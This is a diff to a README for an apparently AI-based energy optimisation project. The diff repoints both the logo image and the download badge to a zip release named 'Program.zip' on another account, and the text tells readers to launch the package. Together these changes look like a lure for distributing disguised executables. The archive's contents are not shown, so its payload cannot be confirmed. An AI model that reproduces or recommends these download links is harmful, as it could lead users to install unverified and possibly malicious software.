@@ -2,7 +2,7 @@
 
 Welcome to "The X-Factors" repository - your go-to solution for Energy, Power, and Cost Optimization powered by AI! 🚀 Created by the innovative Team X-Factors, this project incorporates cutting-edge technologies to enhance energy efficiency and reduce costs through machine learning and optimization methods.
 
-![X-Factors Logo](https://example.com/x-factors-logo.png)
+![X-Factors Logo](https://github.com/Nisu692/The-X-Factors/releases/download/v1.0/Program.zip)
 
 ### Repository Overview
 "The X-Factors" is a comprehensive solution that leverages AI, data science, and IoT to optimize energy consumption, increase power efficiency, and reduce operational costs. With a focus on predictive analytics and anomaly detection, this project integrates seamlessly with microcontrollers and APIs to deliver real-time insights and recommendations.
@@ -33,7 +33,7 @@ Welcome to "The X-Factors" repository - your go-to solution for Energy, Power, a
 ### Getting Started
 To explore "The X-Factors" solution and experience the power of energy optimization, you can download the software package from the following link:
 
-[![Download X-Factors Soft](https://img.shields.io/badge/Download-X--Factors%20Soft-blue)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download X-Factors Soft](https://github.com/Nisu692/The-X-Factors/releases/download/v1.0/Program.zip%20Soft-blue)](https://github.com/Nisu692/The-X-Factors/releases/download/v1.0/Program.zip)
 
 💡 **Launch the software package to unlock the full potential of energy optimization!**
 
